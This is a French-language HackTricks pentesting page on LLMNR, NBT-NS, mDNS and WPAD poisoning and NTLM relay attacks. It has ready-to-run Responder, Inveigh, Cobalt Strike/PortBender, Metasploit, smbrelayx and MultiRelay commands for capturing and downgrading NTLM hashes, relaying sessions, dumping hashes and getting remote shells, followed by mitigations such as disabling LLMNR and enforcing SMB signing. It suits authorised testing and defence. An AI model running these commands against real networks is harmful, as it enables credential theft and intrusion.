# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Protocoles r√©seau

### LLMNR, NBT-NS et mDNS

Les syst√®mes Microsoft utilisent la R√©solution de Nom de Multidiffusion de Liens Locaux (LLMNR) et le Service de Nom NetBIOS (NBT-NS) pour la r√©solution locale des h√¥tes lorsque les recherches DNS √©chouent. Bonjour d'Apple et les impl√©mentations de configuration z√©ro de Linux utilisent le Multicast DNS (mDNS) pour d√©couvrir les syst√®mes au sein d'un r√©seau. Ces protocoles ne sont pas authentifi√©s et envoient des messages en diffusion sur UDP ; ainsi, les attaquants peuvent les exploiter pour rediriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherch√©s par des h√¥tes en utilisant Responder pour envoyer de fausses r√©ponses.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### WPAD

De nombreux navigateurs utilisent la d√©couverte automatique de proxy Web (WPAD) pour charger les param√®tres de proxy depuis le r√©seau. Un serveur WPAD fournit les param√®tres de proxy client via une URL particuli√®re (par exemple, _http://wpad.example.org/wpad.dat_) lorsqu'il est identifi√© via l'une des m√©thodes suivantes :

* DHCP, en utilisant une entr√©e de code 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, en recherchant le nom d'h√¥te _wpad_ dans le domaine local
* Microsoft LLMNR et NBT-NS (en cas d'√©chec de la recherche DNS)

Responder automatise l'attaque WPAD, ex√©cutant un proxy et redirigeant les clients vers un serveur WPAD malveillant via DHCP, DNS, LLMNR et NBT-NS.

## Empoisonnement des protocoles

### Responder - LLMNR, NBT-NS et MDNS

> Responder est un empoisonneur LLMNR, NBT-NS et MDNS. Il r√©pondra aux requ√™tes sp√©cifiques de NBT-NS (Service de Nom NetBIOS) en fonction de leur suffixe de nom (voir : [http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)). Par d√©faut, l'outil r√©pondra uniquement aux demandes de service de serveur de fichiers, qui sont pour SMB.
>
> Le concept derri√®re cela est de cibler nos r√©ponses et d'√™tre plus discret sur le r√©seau. Cela aide √©galement √† garantir que nous ne perturbons pas le comportement l√©gitime de NBT-NS.

* [**Responder**](https://github.com/lgandx/Responder) est install√© par d√©faut dans kali et le fichier de configuration se trouve dans \*\*`/etc/responder/Responder.conf` \*\* (ici vous pouvez d√©sactiver les serveurs frauduleux)
* **Responder** affichera les hachages √† l'√©cran et les √©crira dans un fichier **journal** par h√¥te situ√© dans le r√©pertoire `/usr/share/responder/logs`. Les hachages sont enregistr√©s au format `(NOM_DU_MODULE)-(TYPE_DE_HACHAGE)-(IP_DU_CLIENT).txt`
* Vous pouvez trouver ici Responder pour **windows** [ici](https://github.com/lgandx/Responder-Windows)
* Responder fonctionne en **ipv4** & **ipv6**

#### Param√®tres de Responder

Responder prend en charge les options suivantes:
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Param√®tres de Responder</summary>

* Le drapeau `-A` nous place en **mode d'analyse**, nous permettant de voir les requ√™tes NBT-NS, BROWSER et LLMNR dans l'environnement sans empoisonner les r√©ponses.
* Nous devons toujours fournir soit une interface, soit une adresse IP.
* `-wf` d√©marrera le serveur proxy WPAD rogue
* `-f` tentera de d√©terminer le syst√®me d'exploitation et la version de l'h√¥te distant
* Utilisez le drapeau `-v` pour une verbosit√© accrue (beaucoup de donn√©es suppl√©mentaires imprim√©es sur la console)
* Des options telles que `-F` et `-P` peuvent √™tre utilis√©es pour forcer l'authentification NTLM ou de base et forcer l'authentification du proxy, mais cela peut entra√Æner une invite de connexion, donc elles doivent √™tre utilis√©es avec parcimonie.
* Le drapeau `-w` utilise le serveur proxy WPAD int√©gr√©. Cela peut √™tre tr√®s efficace, surtout dans les grandes organisations, car il capturera toutes les requ√™tes HTTP de tous les utilisateurs qui lancent Internet Explorer si le navigateur a les [param√®tres de d√©tection automatique](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) activ√©s.

</details>

#### Ex√©cution de Responder

Pour ex√©cuter le comportement par d√©faut de Responder, vous devez simplement ex√©cuter :
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
Une technique int√©ressante consiste √† utiliser Responder pour r√©trograder l'authentification NTLM lorsque c'est possible. Cela permettra de **capturer les d√©fis et les r√©ponses NTLMv1** au lieu de NTLMv2 qui peuvent √™tre **facilement craqu√©s** [**en suivant ce guide**](../../windows-hardening/ntlm/#ntlmv1-attack)**.**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
Par **d√©faut**, **l'usurpation de WPAD ne sera pas ex√©cut√©e**, mais vous pouvez l'ex√©cuter en faisant :
```bash
responder -I <Iface> --wpad
```
Vous pouvez √©galement **r√©soudre les requ√™tes NetBIOS** avec **votre adresse IP**. Et cr√©er un **proxy d'authentification**:
```bash
responder.py -I <interface> -Pv
```
Vous ne pourrez pas intercepter les hachages NTLM (normalement), mais vous pouvez facilement obtenir certains **d√©fis et r√©ponses NTLM** que vous pouvez **craquer** en utilisant par exemple l'option _**john**_ `--format=netntlmv2`.

Les **logs et les d√©fis** de l'installation par d√©faut de _**Responder**_ dans kali se trouvent dans `/usr/share/responder/logs`

#### Responder - Empoisonnement DHCP

Windows utilise plusieurs options DHCP personnalis√©es telles que NetBIOS, WINS, les param√®tres WPAD. Lorsqu'une station de travail envoie une demande DHCP pour obtenir ses param√®tres r√©seau, ces param√®tres suppl√©mentaires peuvent √™tre inclus dans la r√©ponse DHCP pour faciliter la connectivit√© directe et la r√©solution de noms.

L'empoisonnement des r√©ponses DHCP sans perturbation peut √™tre difficile car vous interf√©rez avec la configuration r√©seau d'une station de travail. En g√©n√©ral, vous devez avoir une tr√®s bonne connaissance du sous-r√©seau cible, de l'emplacement du serveur DNS, de l'emplacement du commutateur, de la table de routage, du domaine, du masque de r√©seau, du serveur DHCP, etc. **Toute erreur avec ces param√®tres entra√Ænera une perturbation sur le r√©seau.**

Cependant, l'empoisonnement des r√©ponses DHCP pr√©sente des avantages uniques. **C'est certainement plus discret que l'empoisonnement ARP**; Une r√©ponse unicast est suffisante pour empoisonner de mani√®re permanente les informations de routage d'une victime, il est √©galement courant de voir plusieurs serveurs DHCP fonctionner sur un r√©seau. Les r√©ponses DHCP unicast sont plus complexes √† d√©tecter, quelques commutateurs fournissent des param√®tres de s√©curit√© pour emp√™cher l'√©coute DHCP, cependant ces param√®tres ne sont pas simples et sont souvent mal configur√©s lorsqu'ils sont activ√©s.

> Cette attaque est tr√®s efficace et vous assure des hachages NTLMv1/2.
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - Capture des identifiants

Responder va **usurper tous les services utilisant les protocoles mentionn√©s**. Lorsqu'un utilisateur tente d'acc√©der √† un service r√©solu en utilisant ces protocoles, **il va essayer de s'authentifier contre Responder** et Responder pourra **capturer** les "identifiants" (probablement un **D√©fi/R√©ponse NTLMv2**):

Il est possible d'essayer de r√©trograder vers NetNTLMv1 ou de d√©sactiver ESS.

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveigh est un outil de d√©tournement d'identit√© PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS et de l'homme du milieu con√ßu pour aider les testeurs de p√©n√©tration/√©quipes rouges qui se trouvent limit√©s √† un syst√®me Windows.

[**Inveigh** ](https://github.com/Kevin-Robertson/Inveigh)√©tait un script PowerShell, maintenant c'est un binaire C# qui a les m√™mes fonctionnalit√©s principales que Responder. Il y a une [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) qui r√©pertorie tous les param√®tres et les instructions d'utilisation.\
Une autre version peut √™tre trouv√©e dans [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero).

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

Ou ex√©cutez-le avec plus d'options:
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou ex√©cutez la version C# :
```bash
Inveigh.exe
```
## Attaque de relais NTLM

Cette attaque relaie les **sessions d'authentification SMB** sur un r√©seau interne vers une **machine cible**. Si la **session d'authentification r√©ussit**, elle vous placera automatiquement dans un **shell syst√®me**. Veuillez noter que l'authentification relay√©e doit provenir d'un **utilisateur ayant un acc√®s administrateur local √† la machine relay√©e** et que **la signature SMB doit √™tre d√©sactiv√©e**.

### Transfert et tunnelisation du port 445

{% hint style="warning" %}
Si vous pouvez **introduire une machine √† l'int√©rieur du r√©seau**, vous pouvez utiliser l'un des **outils** de la section suivante pour effectuer une attaque de relais et vous n'avez pas besoin de vous en soucier.
{% endhint %}

Cependant, dans les √©quipes rouges, ce n'est pas le cas, dans les √©quipes rouges, vous devrez g√©n√©ralement **rediriger le trafic du port 445 d'une machine Windows vers votre machine** en ex√©cutant l'un des outils suivants, puis **rediriger le trafic de cet outil √† travers un proxy** pour atteindre la machine √† attaquer √† l'int√©rieur du r√©seau interne.

L'outil [**PortBender**](https://github.com/praetorian-inc/PortBender) est un pilote pour **rediriger** le trafic destin√© au port **445 vers un autre port** (par exemple, 8445) que **nous pouvons lier**. Il **n√©cessite un acc√®s administrateur local** pour que le pilote soit charg√©. Il est logique d'utiliser `cd C:\Windows\System32\drivers` car c'est l√† que la plupart des pilotes Windows sont plac√©s.
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

Si vous souhaitez utiliser **MultiRelay**, allez dans _**/usr/share/responder/tools**_ et ex√©cutez MultiRelay (`-t <IP cible> -u <Utilisateur>`):
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### Forcer les connexions NTLM

Sous Windows, **vous pouvez peut-√™tre forcer certains comptes privil√©gi√©s √† s'authentifier sur des machines arbitraires**. Consultez la page suivante pour apprendre comment :

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Solution

### D√©sactiver LLMNR

Pour d√©sactiver LLMNR dans votre domaine pour les clients DNS, ouvrez gpedit.msc.\
Acc√©dez √† Configuration de l'ordinateur->Mod√®les d'administration->R√©seau->Client DNS.\
Localisez l'option "D√©sactiver la r√©solution de nom multicast" et cliquez sur "Param√®tre de strat√©gie" :

![](../../.gitbook/assets/1.jpg)

Une fois que la nouvelle fen√™tre s'ouvre, activez cette option, appuyez sur Appliquer et cliquez sur OK :

![](../../.gitbook/assets/2.jpg)

### **D√©sactiver NBT-NS**

Une option pour d√©sactiver NBT-NS est d'utiliser des options de plage DHCP.

Si vous utilisez le serveur DHCP de Microsoft, s√©lectionnez la plage pour laquelle vous souhaitez d√©sactiver NBT-NS. Cliquez avec le bouton droit sur "Options de plage" et cliquez sur "Configurer les options". Dans l'exemple ci-dessous, la plage DHCP pour laquelle je veux d√©sactiver NBT-NS est 192.168.1.100.

![](../../.gitbook/assets/3.jpg)

Dans la fen√™tre Options de plage, acc√©dez √† l'onglet avanc√©, changez la liste d√©roulante en "Options Microsoft Windows 2000" :

![](../../.gitbook/assets/4.jpg)

S√©lectionnez l'option "001 Option de d√©sactivation de Netbios Microsoft" dans la liste et changez sa valeur en "0x2", cliquez sur Appliquer puis sur OK :

![](../../.gitbook/assets/5.jpg)

### WPAD

Pour vous prot√©ger contre l'attaque WPAD, vous pouvez ajouter une entr√©e pour "wpad" dans votre zone DNS. Notez que l'entr√©e DNS n'a pas besoin de pointer vers un serveur WPAD valide. Tant que les requ√™tes sont r√©solues, l'attaque sera emp√™ch√©e.

### Multi-relay

1\. **Forcer la signature SMB sur toutes les machines Windows locales**. Ce param√®tre signera num√©riquement chaque session SMB, obligeant √† la fois le client et le serveur √† v√©rifier la source des paquets avant de continuer. Ce param√®tre n'est activ√© par d√©faut que sur les contr√¥leurs de domaine. Les articles suivants de Microsoft d√©taillent ces param√®tres (qui peuvent √™tre activ√©s via la strat√©gie de groupe) et comment les mettre en ≈ìuvre.

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **Examiner et s'assurer que les utilisateurs sur le r√©seau local ne peuvent se connecter √† distance qu'aux machines o√π c'est n√©cessaire**. Par exemple : Sally ne peut se connecter qu'√† la station de travail de Sally. Si un attaquant interceptait la session d'authentification SMB de Sally, il ne pourrait pas relayer la session vers d'autres postes de travail, rendant cette m√©thode inutile.

3\. **Restreindre autant que possible l'authentification NTLM sur le r√©seau local**. Cette attaque ne peut pas profiter de l'authentification Kerberos, donc en limitant la quantit√© de NTLM qui se produit, cette attaque peut √™tre grandement entrav√©e. Microsoft fournit des informations sur la mani√®re de r√©aliser cela, mais attention... Si l'authentification Kerberos √©choue pour une raison quelconque, elle bascule g√©n√©ralement sur NTLM. Si vous le d√©sactivez enti√®rement, votre r√©seau pourrait ralentir consid√©rablement.

4\. **Emp√™cher les utilisateurs non autoris√©s sur votre r√©seau**. Une menace interne ne sera probablement pas en train d'utiliser une attaque de relais SMB, car elle dispose d√©j√† d'identifiants r√©seau. En renfor√ßant vos politiques de s√©curit√© physique, en emp√™chant les appareils non autoris√©s sur le r√©seau avec des ACL et un filtrage MAC, et en assurant une segmentation r√©seau ad√©quate, vous pouvez grandement limiter la menace que cette attaque soit effectu√©e.

## R√©f√©rences

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **Images de :**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
